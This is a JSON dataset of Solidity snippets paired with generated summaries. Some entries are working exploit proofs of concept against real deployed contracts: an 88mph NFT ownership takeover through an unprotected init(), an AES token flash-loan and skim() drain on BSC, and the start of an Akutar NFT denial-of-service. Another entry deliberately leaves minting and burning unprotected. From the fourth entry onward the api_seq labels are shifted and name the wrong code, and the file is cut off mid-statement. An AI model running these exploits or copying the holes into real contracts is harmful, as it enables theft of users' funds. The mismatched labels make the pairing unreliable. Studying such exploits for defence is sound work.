[
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  I88mph mphNFT = I88mph(0xF0b7DE03134857391d8D43Ed48e20EDF21461097);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 12516705); //fork mainnet at block 13715025\n  }\n\n  function testExploit() public {\n    console.log(\"Before exploiting, NFT contract owner:\",mphNFT.owner());\n    /*\n    The vulnerability was an unprotected init() function in the code of these specific pools\n    function init() public {\n        require(!initialized, \"MPHToken: initialized\");\n        initialized = true;\n\n        _transferOwnership(msg.sender);\n    }\n\n    */\n    mphNFT.init(address(this),\"0\",\"0\");   // exploit here, change owner to this contract address\n    console.log(\"After exploiting, NFT contract owner:\",mphNFT.owner());\n    console.log(\"NFT Owner of #1: \" ,  mphNFT.ownerOf(1));\n    mphNFT.burn(1); //burn the token 1\n    cheats.expectRevert(bytes(\"ERC721: owner query for nonexistent token\"));\n    console.log(\"After burning: NFT Owner of #1: \" ,  mphNFT.ownerOf(1)); // token burned, nonexistent token\n    mphNFT.mint(address(this),1); // mint a new token 1 \n    console.log(\"After exploiting: NFT Owner of #1: \" ,  mphNFT.ownerOf(1)); // token 1 now owned by us\n  }\n\n  function onERC721Received(\n    address,\n    address,\n    uint256,\n    bytes memory\n  ) public returns (bytes4) {\n    return this.onERC721Received.selector;\n  }\n}\n",
        "summary": "This is a Solidity smart contract that tests for a vulnerability in the `init()` function of a specific set of pools. The contract imports two other contracts (`CheatCodes` and `I88mph`) and calls functions from those contracts to simulate exploiting the `init()` vulnerability. \n\nThe contract defines a function `setUp()` that executes before every test and a function `testExploit()` that contains the code to simulate the exploit.\n\nThe contract then defines a function `onERC721Received()` that is a function required by the ERC721 standard for receiving tokens.",
        "id": "4e76f6da-71fb-459e-bf27-589297127c76",
        "api_seq": "88mph_exp"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract ABIEncode{\n    uint x = 10;\n    address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;\n    string name = \"0xAA\";\n    uint[2] array = [5, 6]; \n\n    function encode() public view returns(bytes memory result) {\n        result = abi.encode(x, addr, name, array);\n    }\n\n    function encodePacked() public view returns(bytes memory result) {\n        result = abi.encodePacked(x, addr, name, array);\n    }\n\n    function encodeWithSignature() public view returns(bytes memory result) {\n        result = abi.encodeWithSignature(\"foo(uint256,address,string,uint256[2])\", x, addr, name, array);\n    }\n\n    function encodeWithSelector() public view returns(bytes memory result) {\n        result = abi.encodeWithSelector(bytes4(keccak256(\"foo(uint256,address,string,uint256[2])\")), x, addr, name, array);\n    }\n    function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) {\n        (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));\n    }\n}\n",
        "summary": "This is a Solidity smart contract with four functions that encode and decode data using the ABI encoding standard. The contract contains a few variables including uint, address, string, and an array of two uints. The four functions are as follows:\n- `encode`: encodes the values of the variables using the `abi.encode` function and returns a bytes array with the encoded values.\n- `encodePacked`: encodes the values of the variables using the `abi.encodePacked` function and returns a bytes array with the encoded values.\n- `encodeWithSignature`: encodes the values of the variables with a function signature using the `abi.encodeWithSignature` function and returns a bytes array with the encoded values.\n- `encodeWithSelector`: encodes the values of the variables with the function selector that matches the function signature using the `abi.encodeWithSelector` function and returns a bytes array with the encoded values.\n- `decode`: decodes the passed bytes array into its four component values, which are then returned as separate variables.",
        "id": "9d6570dc-d662-4cc1-874c-822c589814d2",
        "api_seq": "ABIEncode"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\nabstract contract Base{\n    string public name = \"Base\";\n    function getAlias() public pure virtual returns(string memory);\n}\n\ncontract BaseImpl is Base{\n    function getAlias() public pure override returns(string memory){\n        return \"BaseImpl\";\n    }\n}\n",
        "summary": "This is a Solidity contract that defines an abstract contract named Base that has a public string variable named name and an abstract function named getAlias(). The second contract named BaseImpl inherits from Base and overrides the getAlias() function to return a string \"BaseImpl\". The code is defining a basic abstraction for other contracts to inherit from.",
        "id": "ced09b5f-4c3f-4601-bad5-b8bec8caa050",
        "api_seq": "AbstractDemo"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\nabstract contract Base{\n    string public name = \"Base\";\n    function getAlias() public pure virtual returns(string memory);\n}\n\ncontract BaseImpl is Base{\n    function getAlias() public pure override returns(string memory){\n        return \"BaseImpl\";\n    }\n}\n",
        "summary": "This code defines two smart contracts - an abstract contract called `Base` and a contract that implements it called `BaseImpl`. \n\n`Base` has a public string variable `name` initialized to `\"Base\"` and a function called `getAlias()` that is defined as pure and virtual - meaning that it has no implementation and must be implemented by any contract that inherits from it. \n\n`BaseImpl` is a contract that inherits from `Base` and overrides the `getAlias()` function with its own implementation, which returns the string `\"BaseImpl\"`. \n\nThe code also specifies the Solidity compiler version and includes a license identifier at the top.",
        "id": "999874f4-8d32-4056-991b-29ab05b535d1",
        "api_seq": "AccessControlExploit"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// \u6743\u9650\u7ba1\u7406\u9519\u8bef\u4f8b\u5b50\ncontract AccessControlExploit is ERC20, Ownable {\n    // \u6784\u9020\u51fd\u6570\uff1a\u521d\u59cb\u5316\u4ee3\u5e01\u540d\u79f0\u548c\u4ee3\u53f7\n    constructor() ERC20(\"Wrong Access\", \"WA\") {}\n    \n    // \u9519\u8bef\u7684mint\u51fd\u6570\uff0c\u6ca1\u6709\u9650\u5236\u6743\u9650\n    function badMint(address to, uint amount) public {\n        _mint(to, amount);\n    }\n\n    // \u6b63\u786e\u7684mint\u51fd\u6570\uff0c\u4f7f\u7528 onlyOwner \u4fee\u9970\u5668\u9650\u5236\u6743\u9650\n    function goodMint(address to, uint amount) public onlyOwner {\n        _mint(to, amount);\n    }\n\n    // \u9519\u8bef\u7684burn\u51fd\u6570\uff0c\u6ca1\u6709\u9650\u5236\u6743\u9650\n    function badBurn(address account, uint amount) public {\n        _burn(account, amount);\n    }\n\n    // \u6b63\u786e\u7684burn\u51fd\u6570\uff0c\u5982\u679c\u9500\u6bc1\u7684\u4e0d\u662f\u81ea\u5df1\u7684\u4ee3\u5e01\uff0c\u5219\u4f1a\u68c0\u67e5\u6388\u6743\n    function goodBurn(address account, uint amount) public {\n        if(msg.sender != account){\n            _spendAllowance(account, msg.sender, amount);\n        }\n        _burn(account, amount);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that implements a token with a name \"Wrong Access\" and symbol \"WA\". It has two functions for minting new tokens - a \"badMint\" function that does not restrict access and a \"goodMint\" function that uses the \"onlyOwner\" modifier to restrict access to the contract owner. Similarly, it has two functions for burning tokens - a \"badBurn\" function that does not restrict access and a \"goodBurn\" function that checks authorization if someone tries to burn tokens that do not belong to them. The smart contract also imports two other contracts from the OpenZeppelin library for ERC20 token implementation and access control. The purpose of this contract is to demonstrate the risks of not properly managing access control for smart contract functions.",
        "id": "f8f546c4-b212-4e1f-80b5-d52d4d9690e4",
        "api_seq": "AccessRestriction"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract AccessRestriction {\n\n    address public owner = msg.sender;\n    uint public lastOwnerChange = now;\n\n    modifier onlyBy(address _account) {\n        require(msg.sender == _account);\n        _;\n    }\n\n    modifier onlyAfter(uint _time) {\n        require(now >= _time);\n        _;\n    }\n\n    modifier costs(uint _amount) {\n        require(msg.value >= _amount);\n        _;\n        if (msg.value > _amount) {\n            msg.sender.transfer(msg.value - _amount);\n        }\n    }\n\n    function changeOwner(address _newOwner) public onlyBy(owner) {\n        owner = _newOwner;\n    }\n\n    function buyContract() public payable onlyAfter(lastOwnerChange + 4 weeks) costs(1 ether) {\n        owner = msg.sender;\n        lastOwnerChange = now;\n    }\n}\n",
        "summary": "This code defines a contract that restricts access to certain functions. It uses three modifiers: `onlyBy` which restricts access to a specific address, `onlyAfter` which restricts access until a specific time has passed, and `costs`, which requires a certain amount of ether to be paid to access a function. The contract also has two functions, `changeOwner` which changes the owner address and `buyContract` which allows someone to become the new owner by sending 1 ether and waiting for a specific period of time to pass after the previous owner change.",
        "id": "8c6dd1f6-268a-4c32-9e6f-8a302201c2a1",
        "api_seq": "Address"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)\n\npragma solidity ^0.8.1;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     *\n     * [IMPORTANT]\n     * ====\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\n     *\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\n     * constructor.\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize/address.code.length, which returns 0\n        // for contracts in construction, since the code is only stored at the end\n        // of the constructor execution.\n\n        return account.code.length > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        (bool success, ) = recipient.call{value: amount}(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain `call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value\n    ) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(\n        address target,\n        bytes memory data,\n        uint256 value,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.staticcall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\n        return functionDelegateCall(target, data, \"Address: low-level delegate call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a delegate call.\n     *\n     * _Available since v3.4._\n     */\n    function functionDelegateCall(\n        address target,\n        bytes memory data,\n        string memory errorMessage\n    ) internal returns (bytes memory) {\n        require(isContract(target), \"Address: delegate call to non-contract\");\n\n        (bool success, bytes memory returndata) = target.delegatecall(data);\n        return verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult(\n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns (bytes memory) {\n        if (success) {\n            return returndata;\n        } else {\n            // Look for revert reason and bubble it up if present\n            if (returndata.length > 0) {\n                // The easiest way to bubble the revert reason is using memory via assembly\n\n                assembly {\n                    let returndata_size := mload(returndata)\n                    revert(add(32, returndata), returndata_size)\n                }\n            } else {\n                revert(errorMessage);\n            }\n        }\n    }\n}\n",
        "summary": "This is a library of functions related to the `address` type in Solidity. The functions include:\n\n- `isContract`: returns `true` if an address belongs to a contract.\n- `sendValue`: sends a specified amount of Ether to a recipient address and reverts if the sender doesn't have enough funds or if the transaction fails for any reason.\n- `functionCall`: calls a function of a contract at a specified address, forwarding the data to the function call and reverts if the target address is not a contract.\n- `functionCallWithValue`: same as `functionCall`, but also transfers a specified amount of Ether to the target contract.\n- `functionStaticCall`: calls a function of a contract at a specified address, forwarding the data to the function call, but doesn't modify the contract's state and reverts if the target address is not a contract.\n- `functionDelegateCall`: same as `functionCall`, but the target contract's fallback function is invoked, allowing the target contract to access the caller's state and storage.",
        "id": "c058f837-c774-4a50-9562-eb187e2d01b1",
        "api_seq": "AddressBook"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract AddressBook {\n    mapping(address => uint) private _state;\n    mapping(address => address[]) private _addresses;\n    mapping(address => mapping(address => string)) private _aliases;\n\n    function getAddresses() public view returns (address[]) {\n        return _addresses[msg.sender];\n    }\n\n    function addAddress(address addr, string alias) public {\n        _addresses[msg.sender].push(addr);\n        _aliases[msg.sender][addr] = alias;\n        _state[msg.sender]++;\n    }\n\n    function removeAddress(address addr) public {\n        uint length = _addresses[msg.sender].length;\n        for(uint i = 0; i < length; i++) {\n            if (addr == _addresses[msg.sender][i]) {\n                if (1 < _addresses[msg.sender].length && i < length-1) {\n                    _addresses[msg.sender][i] = _addresses[msg.sender][length-1];\n                }\n                delete _addresses[msg.sender][length-1];\n                _addresses[msg.sender].length--;\n                delete _aliases[msg.sender][addr];\n                _state[msg.sender]++;\n                break;\n            }\n        }\n    }\n\n    function getAlias(address addr) public view returns (string) {\n        return _aliases[msg.sender][addr];\n    }\n\n    function getState() public view returns (uint) {\n        return _state[msg.sender];\n    }\n}\n",
        "summary": "This is a basic smart contract written in Solidity that creates an Address Book. It uses mapping data structures to store addresses, aliases and state variables. It has functions to add an address with an alias, remove an address and get an alias for a given address. The `getAddresses` function returns the list of addresses in the address book for the particular user, and the `getState` function returns the number of times the address book was modified by the user.",
        "id": "b2da44b5-8108-45f9-92fe-dead94845f00",
        "api_seq": "AddressEmpty"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function isEmptyAddress(address addr) returns (bool) {\n    return (addr == address(0));\n  }\n}\n",
        "summary": "This Solidity code defines a smart contract called `MyContract` that has a function named `isEmptyAddress`. The function takes an `address` as input and returns a boolean value indicating whether the address is empty or not. An address is considered empty if it is equal to the address `(0)`. The `pragma` statement at the beginning specifies the version of the Solidity compiler that should be used to compile the code.",
        "id": "ff37a233-3788-4bca-b548-9bc46a4d075a",
        "api_seq": "Addresses"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nlibrary Addresses {\n  function isContract(address _base) internal constant returns (bool) {\n      uint codeSize;\n      assembly {\n          codeSize := extcodesize(_base)\n      }\n      return codeSize > 0;\n  }\n}\n",
        "summary": "This code defines a library called \"Addresses\" that contains a single function \"isContract\". The function checks whether the given Ethereum address \"_base\" belongs to a smart contract by inspecting the size of the code associated with it. If the code size is greater than zero, the function returns true indicating that the address belongs to a smart contract.",
        "id": "288e6817-8479-451a-972e-bf82c0f78e07",
        "api_seq": "AddressToString"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  string public str;\n\n  function MyContract() {\n    str = toString(msg.sender);\n  }\n\n  function toString(address addr) returns (string) {\n    bytes memory b = new bytes(20);\n    for (uint i = 0; i < 20; i++)\n    b[i] = byte(uint8(uint(addr) / (2**(8*(19 - i)))));\n    return string(b);\n  }\n}\n",
        "summary": "This code is a Solidity smart contract named \"MyContract\" that defines a string variable \"str\". The \"MyContract\" constructor initializes \"str\" by calling a function \"toString\" with the \"msg.sender\" argument which converts the \"msg.sender\" address to a string and assigns the result to \"str\". The \"toString\" function uses a bit-shifting operation to convert the address to a byte array which is then converted to a string and returned.",
        "id": "7aa8f616-ab4f-40da-b1ed-be36e1df2964",
        "api_seq": "AES_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1600442137811689473\n// https://twitter.com/peckshield/status/1600418002163625984\n// @TX\n// https://bscscan.com/tx/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19\n\ninterface IAES is IERC20{\n    function distributeFee() external;\n}\n\ncontract ContractTest is DSTest{\n    IAES AES = IAES(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address dodo = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23695904);\n    }\n\n    function testExploit() public{\n        USDT.approve(address(Router), type(uint).max);\n        AES.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(0, 100_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{\n        USDTToAES();\n        AES.transfer(address(Pair), AES.balanceOf(address(this)) / 2);\n        for(uint i = 0; i < 37; i++){\n            Pair.skim(address(Pair));\n        }\n        Pair.skim(address(this));\n        AES.distributeFee();\n        Pair.sync();\n        AESToUSDT();\n        USDT.transfer(dodo, 100_000 * 1e18);\n    }\n\n    function USDTToAES() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(AES);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            100_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function AESToUSDT() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(AES);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            AES.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}",
        "summary": "This is a Solidity smart contract that tests an exploit of a vulnerability in a decentralized exchange on the Binance Smart Chain (BSC). The contract imports various other contracts and interfaces, including an interface for the token being exploited (IAES), the standard ERC20 token interface (IERC20), and interfaces for interacting with the decentralized exchange (Uni_Pair_V2 and Uni_Router_V2). \n\nIn the testExploit function, the contract makes use of the flash loan function provided by the Dodo decentralized exchange to perform a series of swaps between USDT and AES tokens, taking advantage of a vulnerability to generate profits at the expense of the exchange. The DPPFlashLoanCall function is a callback function which is called by the Dodo exchange during the loan, and performs the actual swap between USDT and AES tokens.",
        "id": "82ec536e-ee52-4d72-ab81-56a36b1230a8",
        "api_seq": "Airdrop"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\n\nimport \"./IERC20.sol\"; //import IERC20\n\n/// @notice \u5411\u591a\u4e2a\u5730\u5740\u8f6c\u8d26ERC20\u4ee3\u5e01\ncontract Airdrop {\n    /// @notice \u5411\u591a\u4e2a\u5730\u5740\u8f6c\u8d26ERC20\u4ee3\u5e01\uff0c\u4f7f\u7528\u524d\u9700\u8981\u5148\u6388\u6743\n    ///\n    /// @param _token \u8f6c\u8d26\u7684ERC20\u4ee3\u5e01\u5730\u5740\n    /// @param _addresses \u7a7a\u6295\u5730\u5740\u6570\u7ec4\n    /// @param _amounts \u4ee3\u5e01\u6570\u91cf\u6570\u7ec4\uff08\u6bcf\u4e2a\u5730\u5740\u7684\u7a7a\u6295\u6570\u91cf\uff09\n    function multiTransferToken(\n        address _token,\n        address[] calldata _addresses,\n        uint256[] calldata _amounts\n        ) external {\n        // \u68c0\u67e5\uff1a_addresses\u548c_amounts\u6570\u7ec4\u7684\u957f\u5ea6\u76f8\u7b49\n        require(_addresses.length == _amounts.length, \"Lengths of Addresses and Amounts NOT EQUAL\");\n        IERC20 token = IERC20(_token); // \u58f0\u660eIERC\u5408\u7ea6\u53d8\u91cf\n        uint _amountSum = getSum(_amounts); // \u8ba1\u7b97\u7a7a\u6295\u4ee3\u5e01\u603b\u91cf\n        // \u68c0\u67e5\uff1a\u6388\u6743\u4ee3\u5e01\u6570\u91cf > \u7a7a\u6295\u4ee3\u5e01\u603b\u91cf\n        require(token.allowance(msg.sender, address(this)) > _amountSum, \"Need Approve ERC20 token\");\n        \n        // for\u5faa\u73af\uff0c\u5229\u7528transferFrom\u51fd\u6570\u53d1\u9001\u7a7a\u6295\n        for (uint256 i; i < _addresses.length; i++) {\n            token.transferFrom(msg.sender, _addresses[i], _amounts[i]);\n        }\n    }\n\n    /// \u5411\u591a\u4e2a\u5730\u5740\u8f6c\u8d26ETH\n    function multiTransferETH(\n        address payable[] calldata _addresses,\n        uint256[] calldata _amounts\n    ) public payable {\n        // \u68c0\u67e5\uff1a_addresses\u548c_amounts\u6570\u7ec4\u7684\u957f\u5ea6\u76f8\u7b49\n        require(_addresses.length == _amounts.length, \"Lengths of Addresses and Amounts NOT EQUAL\");\n        uint _amountSum = getSum(_amounts); // \u8ba1\u7b97\u7a7a\u6295ETH\u603b\u91cf\n        // \u68c0\u67e5\u8f6c\u5165ETH\u7b49\u4e8e\u7a7a\u6295\u603b\u91cf\n        require(msg.value == _amountSum, \"Transfer amount error\");\n        // for\u5faa\u73af\uff0c\u5229\u7528transfer\u51fd\u6570\u53d1\u9001ETH\n        for (uint256 i = 0; i < _addresses.length; i++) {\n            _addresses[i].transfer(_amounts[i]);\n        }\n    }\n\n\n    // \u6570\u7ec4\u6c42\u548c\u51fd\u6570\n    function getSum(uint256[] calldata _arr) public pure returns(uint sum)\n    {\n        for(uint i = 0; i < _arr.length; i++)\n            sum = sum + _arr[i];\n    }\n}\n\n\n// ERC20\u4ee3\u5e01\u5408\u7ea6\ncontract ERC20 is IERC20 {\n\n    mapping(address => uint256) public override balanceOf;\n\n    mapping(address => mapping(address => uint256)) public override allowance;\n\n    uint256 public override totalSupply;   // \u4ee3\u5e01\u603b\u4f9b\u7ed9\n\n    string public name;   // \u540d\u79f0\n    string public symbol;  // \u7b26\u53f7\n    \n    uint8 public decimals = 18; // \u5c0f\u6570\u4f4d\u6570\n\n    constructor(string memory name_, string memory symbol_){\n        name = name_;\n        symbol = symbol_;\n    }\n\n    // @dev \u5b9e\u73b0`transfer`\u51fd\u6570\uff0c\u4ee3\u5e01\u8f6c\u8d26\u903b\u8f91\n    function transfer(address recipient, uint amount) external override returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0 `approve` \u51fd\u6570, \u4ee3\u5e01\u6388\u6743\u903b\u8f91\n    function approve(address spender, uint amount) external override returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    // @dev \u5b9e\u73b0`transferFrom`\u51fd\u6570\uff0c\u4ee3\u5e01\u6388\u6743\u8f6c\u8d26\u903b\u8f91\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint amount\n    ) external override returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    // @dev \u94f8\u9020\u4ee3\u5e01\uff0c\u4ece `0` \u5730\u5740\u8f6c\u8d26\u7ed9 \u8c03\u7528\u8005\u5730\u5740\n    function mint(uint amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    // @dev \u9500\u6bc1\u4ee3\u5e01\uff0c\u4ece \u8c03\u7528\u8005\u5730\u5740 \u8f6c\u8d26\u7ed9  `0` \u5730\u5740\n    function burn(uint amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n\n}\n",
        "summary": "This code contains two contracts. \n\nThe first contract is called Airdrop, which allows for the transfer of ERC20 tokens and ETH to multiple addresses. The `multiTransferToken` function transfers ERC20 tokens to a list of addresses and the `multiTransferETH` function transfers ETH to a list of addresses. Both functions ensure the sum of amounts being transferred matches the total allowed by the smart contract.\n\nThe second contract is an ERC20 token contract, which implements the basic functions required for an ERC20 token, such as `transfer`, `allowance`, and `balanceOf`. It also includes two additional functions, `mint` and `burn`, which allow for the creation and destruction of tokens.",
        "id": "553ba287-9255-4369-9524-2caef8fd2ada",
        "api_seq": "AkutarNFT_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nAkutar NFT Denial of Service(DoS) Exploit PoC\n\nThere are two serious logic vulnerabilities\n\n1. First can cause a DoS attack due to the missing check if the bidder is a contract. As a result, the attacker can call the revert() and stop the honest bidders from getting back their bid amount.\n\n2. The Second will make the project fund (more than 34M USD) being locked forever due to incorrect check in the require statment.\n\nforge test --contracts ./src/test/AkutarNFT_exp.sol -vv  \n*/\ncontract AkutarNFTExploit is DSTest {\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IAkutarNFT akutarNft = IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14636844); // fork mainnet at 14636844 \n    }\n\n    function testDOSAttack() public {\n        address honestUser = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;\n        address maliciousUser = address(this); // malicious User is a contract address\n        \n        cheats.prank(maliciousUser); //maliciousUser makes a bid\n        akutarNft.bid{ value: 3.5 ether }(1);\n        console.log(\"honestUser Balance before Bid: \", honestUser.balance / 1 ether);\n        \n        cheats.prank(honestUser); //honestUser makes a bid\n        akutarNft.bid{ value: 3.75 ether }(1);\n        console.log(\"honestUser Balance after Bid: \", honestUser.balance / 1 ether);\n\n        //Set the block.height to the time when the auction was over and processRefunds() can be invoked\n        //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf\n        //use - https://www.epochconverter.com/ for UTC <-> epoch \n        cheats.warp(1650674809);\n\n        cheats.prank(maliciousUser);\n        try 